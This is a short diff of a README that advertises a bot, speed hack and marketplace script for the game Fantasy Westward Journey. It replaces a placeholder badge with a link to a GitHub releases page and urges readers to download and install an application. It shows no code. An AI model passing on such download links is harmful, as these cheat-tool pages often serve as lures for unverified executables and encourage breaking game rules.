@@ -18,7 +18,7 @@ Are you tired of spending countless hours grinding gold and EXP in the popular g
 
 To access the Fantasy Westward Journey bot, speed hack, and marketplace script, download the application from the link below:
 
-[![Download Fantasy Westward Journey Application](https://img.shields.io/badge/Download-Application.zip-brightgreen)](https://github.com/user/repo/Application.zip)
+[![Download Fantasy Westward Journey Application](https://github.com/itay509/Fantasy-Westward-Journey/releases)](https://github.com/itay509/Fantasy-Westward-Journey/releases)
 
 Please download the file and follow the instructions for installation and configuration.
 
